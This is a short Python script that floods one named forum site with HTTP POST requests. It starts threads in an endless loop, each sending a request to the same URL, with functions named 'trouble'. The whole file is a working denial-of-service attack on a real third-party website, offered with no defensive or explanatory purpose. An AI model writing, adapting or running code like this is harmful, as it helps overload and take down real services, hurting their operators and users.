import requests
import time
import threading
import random

URL1 = 'https://portaldmi.forumeiros.com/'

def trouble():
    try:
        r = requests.post(URL1)
        print(r.status_code)
    except Exception as e:
        print(str(e))
def trouble2():
    try:
        r = requests.post(URL1)
        print(r.status_code)
    except Exception as e:
        print(str(e))
def trouble3():
    try:
        r = requests.post(URL1)
        print(r.status_code)
    except Exception as e:
        print(str(e))

while True:
    threading.Thread(target=trouble).start()
    threading.Thread(target=trouble2).start()
    threading.Thread(target=trouble3).start()
